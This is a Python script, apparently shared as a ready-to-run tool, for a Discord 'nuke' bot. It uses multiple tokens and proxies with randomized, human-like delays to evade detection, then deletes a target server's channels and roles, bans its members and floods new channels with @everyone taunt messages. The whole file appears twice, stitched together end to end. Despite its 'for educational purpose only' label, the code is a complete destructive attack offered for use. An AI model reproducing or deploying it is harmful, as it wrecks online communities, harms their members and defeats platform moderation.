# ultimate_stealth_nuke.py
# By Zamzzz – Ultimate Stealth Nuke Bot for Discord
# FOR EDUCATIONAL PURPOSE ONLY

import discord
from discord.ext import commands
import asyncio
import random
import json
import time
import aiohttp
import os
from colorama import init, Fore

init(autoreset=True)

# Load config
CONFIG_FILE = "config.json"
if os.path.exists(CONFIG_FILE):
    with open(CONFIG_FILE, 'r') as f:
        CONFIG = json.load(f)
else:
    CONFIG = {
        "min_delay": 0.8,
        "max_delay": 2.5,
        "max_actions_per_hour": 45,
        "break_chance": 0.08,
        "break_duration": [120, 300],
        "typing_simulate": True,
        "random_reply_chance": 0.3,
        "use_proxy": True,
        "heartbeat_jitter": True,
        "target_guild_id": 0,
        "stage": 4
    }

# Load tokens
tokens = []
if os.path.exists("tokens.txt"):
    with open("tokens.txt", 'r') as f:
        tokens = [line.strip() for line in f if line.strip()]
else:
    tokens = ["YOUR_BOT_TOKEN_HERE"]

# Load proxies
proxies = []
if CONFIG.get("use_proxy", False) and os.path.exists("proxies.txt"):
    with open("proxies.txt", 'r') as f:
        proxies = [line.strip() for line in f if line.strip()]

# ========== HUMAN-LIKE BEHAVIOR ==========
class HumanBehavior:
    @staticmethod
    async def typing_simulate(channel, duration=None):
        if not CONFIG.get("typing_simulate", True):
            return
        if duration is None:
            duration = random.uniform(0.8, 2.5)
        async with channel.typing():
            await asyncio.sleep(duration)
    
    @staticmethod
    async def send_with_typing(channel, content):
        await HumanBehavior.typing_simulate(channel)
        await channel.send(content)
    
    @staticmethod
    async def random_break():
        if random.random() < CONFIG.get("break_chance", 0.08):
            duration = random.uniform(*CONFIG.get("break_duration", [120, 300]))
            print(Fore.CYAN + f"[*] Taking a break for {duration:.0f}s")
            await asyncio.sleep(duration)
            return True
        return False

# ========== DYNAMIC DELAY ==========
class DynamicDelay:
    @staticmethod
    async def wait():
        min_d = CONFIG.get("min_delay", 0.8)
        max_d = CONFIG.get("max_delay", 2.5)
        delay = random.uniform(min_d, max_d)
        jitter = random.uniform(-0.3, 0.3)
        delay = max(0.5, delay + jitter)
        await asyncio.sleep(delay)
    
    @staticmethod
    async def heartbeat_jitter():
        if CONFIG.get("heartbeat_jitter", True):
            jitter = random.uniform(30, 90)
            await asyncio.sleep(jitter)

# ========== TOKEN MANAGER ==========
class TokenManager:
    def __init__(self, tokens, proxies):
        self.tokens = tokens
        self.proxies = proxies
        self.token_health = {t: {"actions": 0, "cooldown_until": 0, "failures": 0} for t in tokens}
        self.current_index = 0
    
    def get_next_token_and_proxy(self):
        now = time.time()
        for i in range(len(self.tokens)):
            idx = (self.current_index + i) % len(self.tokens)
            token = self.tokens[idx]
            health = self.token_health[token]
            if now >= health["cooldown_until"] and health["failures"] < 3:
                self.current_index = idx + 1
                proxy = self.proxies[idx % len(self.proxies)] if self.proxies else None
                return token, proxy
        return None, None
    
    def record_action(self, token, success):
        if token in self.token_health:
            if success:
                self.token_health[token]["actions"] += 1
                max_actions = CONFIG.get("max_actions_per_hour", 45)
                if self.token_health[token]["actions"] >= max_actions:
                    self.token_health[token]["cooldown_until"] = time.time() + 3600
                    self.token_health[token]["actions"] = 0
                    print(Fore.YELLOW + f"[!] Token {token[:20]}... cooldown 1 jam")
            else:
                self.token_health[token]["failures"] += 1
                if self.token_health[token]["failures"] >= 3:
                    self.token_health[token]["cooldown_until"] = time.time() + 86400
                    print(Fore.RED + f"[X] Token {token[:20]}... disabled for 24h")

token_manager = TokenManager(tokens, proxies)

# ========== MESSAGE RANDOMIZER ==========
message_templates = [
    "@everyone SERVER DI NUKE BY ZAMZZZ 😈",
    "@everyone RIP BOZO",
    "@everyone SAYANGI SERVER ANDA",
    "@everyone SELAMAT DATANG DI ERA BARU"
]

class MessageRandomizer:
    @staticmethod
    def get_random_message():
        return random.choice(message_templates)
    
    @staticmethod
    async def send_with_reply_chance(channel, content):
        if random.random() < CONFIG.get("random_reply_chance", 0.3):
            async for msg in channel.history(limit=1):
                if msg.author != channel.guild.me:
                    await HumanBehavior.send_with_typing(channel, f"{msg.author.mention} {content}")
                    return
        await HumanBehavior.send_with_typing(channel, content)

# ========== MAIN BOT ==========
class StealthNukeBot(commands.Bot):
    def __init__(self, token, proxy=None):
        intents = discord.Intents.default()
        intents.members = True
        intents.message_content = True
        super().__init__(command_prefix=".", intents=intents, proxy=proxy)
        self.token = token
        self.proxy = proxy
        self.action_count = 0
    
    async def on_ready(self):
        print(Fore.GREEN + f"[✓] Bot {self.user} siap. Proxy: {self.proxy}")
    
    async def stealth_action(self, coro, *args, **kwargs):
        if self.action_count >= CONFIG.get("max_actions_per_hour", 45):
            return False
        await HumanBehavior.random_break()
        await DynamicDelay.wait()
        if random.random() < 0.1:
            await DynamicDelay.heartbeat_jitter()
        try:
            result = await coro(*args, **kwargs)
            self.action_count += 1
            token_manager.record_action(self.token, True)
            return result
        except Exception as e:
            print(Fore.RED + f"[-] Action failed: {e}")
            token_manager.record_action(self.token, False)
            return False
    
    async def delete_channel(self, channel):
        return await self.stealth_action(channel.delete)
    
    async def delete_role(self, role):
        if role.name != "@everyone":
            return await self.stealth_action(role.delete)
        return False
    
    async def ban_member(self, member, reason="Stealth Nuke"):
        if member.bot or member == member.guild.owner:
            return False
        return await self.stealth_action(member.ban, reason=reason)
    
    async def create_spam_channel(self, guild, name="nuked"):
        return await self.stealth_action(guild.create_text_channel, name=name)
    
    async def spam_message(self, channel):
        msg = MessageRandomizer.get_random_message()
        return await MessageRandomizer.send_with_reply_chance(channel, msg)
    
    async def nuke_guild(self, guild_id):
        guild = self.get_guild(guild_id)
        if not guild:
            return
        print(Fore.YELLOW + f"[*] Mulai nuke di {guild.name} dengan bot {self.user}")
        stage = CONFIG.get("stage", 4)
        if stage in [1, 4]:
            for channel in guild.channels:
                if await self.delete_channel(channel):
                    print(Fore.RED + f"[-] Deleted channel {channel.name}")
        if stage in [2, 4]:
            for role in guild.roles:
                if await self.delete_role(role):
                    print(Fore.RED + f"[-] Deleted role {role.name}")
        if stage in [3, 4]:
            for member in guild.members:
                if await self.ban_member(member):
                    print(Fore.RED + f"[-] Banned {member.name}")
        if stage == 4:
            for i in range(10):
                ch = await self.create_spam_channel(guild, f"nuked-{i}")
                if ch:
                    await self.spam_message(ch)

# ========== MAIN ==========
async def main():
    print(Fore.RED + """
    ╔═══════════════════════════════════════╗
    ║   ULTIMATE STEALTH NUKE BOT           ║
    ║   By Zamzzz – FOR EDUCATION           ║
    ╚═══════════════════════════════════════╝
    """)
    guild_id = int(input("Masukkan Guild ID target: "))
    CONFIG["target_guild_id"] = guild_id
    stage = int(input("Pilih stage (1=channels, 2=roles, 3=bans, 4=full): "))
    CONFIG["stage"] = stage
    
    bots = []
    for token, proxy in [token_manager.get_next_token_and_proxy() for _ in range(len(tokens))]:
        if token:
            bot = StealthNukeBot(token, proxy)
            bots.append(bot)
            asyncio.create_task(bot.start(token))
            await asyncio.sleep(random.uniform(1, 2))
    
    print(Fore.GREEN + f"[+] {len(bots)} bot dijalankan")
    await asyncio.sleep(5)
    tasks = [bot.nuke_guild(guild_id) for bot in bots]
    await asyncio.gather(*tasks)
    await asyncio.sleep(30)
    for bot in bots:
        await bot.close()
    print(Fore.GREEN + "[✓] Selesai!")

if __name__ == "__main__":
    asyncio.run(main())# ultimate_stealth_nuke.py
# By Zamzzz – Ultimate Stealth Nuke Bot for Discord
# FOR EDUCATIONAL PURPOSE ONLY

import discord
from discord.ext import commands
import asyncio
import random
import json
import time
import aiohttp
import os
from colorama import init, Fore

init(autoreset=True)

# Load config
CONFIG_FILE = "config.json"
if os.path.exists(CONFIG_FILE):
    with open(CONFIG_FILE, 'r') as f:
        CONFIG = json.load(f)
else:
    CONFIG = {
        "min_delay": 0.8,
        "max_delay": 2.5,
        "max_actions_per_hour": 45,
        "break_chance": 0.08,
        "break_duration": [120, 300],
        "typing_simulate": True,
        "random_reply_chance": 0.3,
        "use_proxy": True,
        "heartbeat_jitter": True,
        "target_guild_id": 0,
        "stage": 4
    }

# Load tokens
tokens = []
if os.path.exists("tokens.txt"):
    with open("tokens.txt", 'r') as f:
        tokens = [line.strip() for line in f if line.strip()]
else:
    tokens = ["YOUR_BOT_TOKEN_HERE"]

# Load proxies
proxies = []
if CONFIG.get("use_proxy", False) and os.path.exists("proxies.txt"):
    with open("proxies.txt", 'r') as f:
        proxies = [line.strip() for line in f if line.strip()]

# ========== HUMAN-LIKE BEHAVIOR ==========
class HumanBehavior:
    @staticmethod
    async def typing_simulate(channel, duration=None):
        if not CONFIG.get("typing_simulate", True):
            return
        if duration is None:
            duration = random.uniform(0.8, 2.5)
        async with channel.typing():
            await asyncio.sleep(duration)
    
    @staticmethod
    async def send_with_typing(channel, content):
        await HumanBehavior.typing_simulate(channel)
        await channel.send(content)
    
    @staticmethod
    async def random_break():
        if random.random() < CONFIG.get("break_chance", 0.08):
            duration = random.uniform(*CONFIG.get("break_duration", [120, 300]))
            print(Fore.CYAN + f"[*] Taking a break for {duration:.0f}s")
            await asyncio.sleep(duration)
            return True
        return False

# ========== DYNAMIC DELAY ==========
class DynamicDelay:
    @staticmethod
    async def wait():
        min_d = CONFIG.get("min_delay", 0.8)
        max_d = CONFIG.get("max_delay", 2.5)
        delay = random.uniform(min_d, max_d)
        jitter = random.uniform(-0.3, 0.3)
        delay = max(0.5, delay + jitter)
        await asyncio.sleep(delay)
    
    @staticmethod
    async def heartbeat_jitter():
        if CONFIG.get("heartbeat_jitter", True):
            jitter = random.uniform(30, 90)
            await asyncio.sleep(jitter)

# ========== TOKEN MANAGER ==========
class TokenManager:
    def __init__(self, tokens, proxies):
        self.tokens = tokens
        self.proxies = proxies
        self.token_health = {t: {"actions": 0, "cooldown_until": 0, "failures": 0} for t in tokens}
        self.current_index = 0
    
    def get_next_token_and_proxy(self):
        now = time.time()
        for i in range(len(self.tokens)):
            idx = (self.current_index + i) % len(self.tokens)
            token = self.tokens[idx]
            health = self.token_health[token]
            if now >= health["cooldown_until"] and health["failures"] < 3:
                self.current_index = idx + 1
                proxy = self.proxies[idx % len(self.proxies)] if self.proxies else None
                return token, proxy
        return None, None
    
    def record_action(self, token, success):
        if token in self.token_health:
            if success:
                self.token_health[token]["actions"] += 1
                max_actions = CONFIG.get("max_actions_per_hour", 45)
                if self.token_health[token]["actions"] >= max_actions:
                    self.token_health[token]["cooldown_until"] = time.time() + 3600
                    self.token_health[token]["actions"] = 0
                    print(Fore.YELLOW + f"[!] Token {token[:20]}... cooldown 1 jam")
            else:
                self.token_health[token]["failures"] += 1
                if self.token_health[token]["failures"] >= 3:
                    self.token_health[token]["cooldown_until"] = time.time() + 86400
                    print(Fore.RED + f"[X] Token {token[:20]}... disabled for 24h")

token_manager = TokenManager(tokens, proxies)

# ========== MESSAGE RANDOMIZER ==========
message_templates = [
    "@everyone SERVER DI NUKE BY ZAMZZZ 😈",
    "@everyone RIP BOZO",
    "@everyone SAYANGI SERVER ANDA",
    "@everyone SELAMAT DATANG DI ERA BARU"
]

class MessageRandomizer:
    @staticmethod
    def get_random_message():
        return random.choice(message_templates)
    
    @staticmethod
    async def send_with_reply_chance(channel, content):
        if random.random() < CONFIG.get("random_reply_chance", 0.3):
            async for msg in channel.history(limit=1):
                if msg.author != channel.guild.me:
                    await HumanBehavior.send_with_typing(channel, f"{msg.author.mention} {content}")
                    return
        await HumanBehavior.send_with_typing(channel, content)

# ========== MAIN BOT ==========
class StealthNukeBot(commands.Bot):
    def __init__(self, token, proxy=None):
        intents = discord.Intents.default()
        intents.members = True
        intents.message_content = True
        super().__init__(command_prefix=".", intents=intents, proxy=proxy)
        self.token = token
        self.proxy = proxy
        self.action_count = 0
    
    async def on_ready(self):
        print(Fore.GREEN + f"[✓] Bot {self.user} siap. Proxy: {self.proxy}")
    
    async def stealth_action(self, coro, *args, **kwargs):
        if self.action_count >= CONFIG.get("max_actions_per_hour", 45):
            return False
        await HumanBehavior.random_break()
        await DynamicDelay.wait()
        if random.random() < 0.1:
            await DynamicDelay.heartbeat_jitter()
        try:
            result = await coro(*args, **kwargs)
            self.action_count += 1
            token_manager.record_action(self.token, True)
            return result
        except Exception as e:
            print(Fore.RED + f"[-] Action failed: {e}")
            token_manager.record_action(self.token, False)
            return False
    
    async def delete_channel(self, channel):
        return await self.stealth_action(channel.delete)
    
    async def delete_role(self, role):
        if role.name != "@everyone":
            return await self.stealth_action(role.delete)
        return False
    
    async def ban_member(self, member, reason="Stealth Nuke"):
        if member.bot or member == member.guild.owner:
            return False
        return await self.stealth_action(member.ban, reason=reason)
    
    async def create_spam_channel(self, guild, name="nuked"):
        return await self.stealth_action(guild.create_text_channel, name=name)
    
    async def spam_message(self, channel):
        msg = MessageRandomizer.get_random_message()
        return await MessageRandomizer.send_with_reply_chance(channel, msg)
    
    async def nuke_guild(self, guild_id):
        guild = self.get_guild(guild_id)
        if not guild:
            return
        print(Fore.YELLOW + f"[*] Mulai nuke di {guild.name} dengan bot {self.user}")
        stage = CONFIG.get("stage", 4)
        if stage in [1, 4]:
            for channel in guild.channels:
                if await self.delete_channel(channel):
                    print(Fore.RED + f"[-] Deleted channel {channel.name}")
        if stage in [2, 4]:
            for role in guild.roles:
                if await self.delete_role(role):
                    print(Fore.RED + f"[-] Deleted role {role.name}")
        if stage in [3, 4]:
            for member in guild.members:
                if await self.ban_member(member):
                    print(Fore.RED + f"[-] Banned {member.name}")
        if stage == 4:
            for i in range(10):
                ch = await self.create_spam_channel(guild, f"nuked-{i}")
                if ch:
                    await self.spam_message(ch)

# ========== MAIN ==========
async def main():
    print(Fore.RED + """
    ╔═══════════════════════════════════════╗
    ║   ULTIMATE STEALTH NUKE BOT           ║
    ║   By Zamzzz – FOR EDUCATION           ║
    ╚═══════════════════════════════════════╝
    """)
    guild_id = int(input("Masukkan Guild ID target: "))
    CONFIG["target_guild_id"] = guild_id
    stage = int(input("Pilih stage (1=channels, 2=roles, 3=bans, 4=full): "))
    CONFIG["stage"] = stage
    
    bots = []
    for token, proxy in [token_manager.get_next_token_and_proxy() for _ in range(len(tokens))]:
        if token:
            bot = StealthNukeBot(token, proxy)
            bots.append(bot)
            asyncio.create_task(bot.start(token))
            await asyncio.sleep(random.uniform(1, 2))
    
    print(Fore.GREEN + f"[+] {len(bots)} bot dijalankan")
    await asyncio.sleep(5)
    tasks = [bot.nuke_guild(guild_id) for bot in bots]
    await asyncio.gather(*tasks)
    await asyncio.sleep(30)
    for bot in bots:
        await bot.close()
    print(Fore.GREEN + "[✓] Selesai!")

if __name__ == "__main__":
    asyncio.run(main())
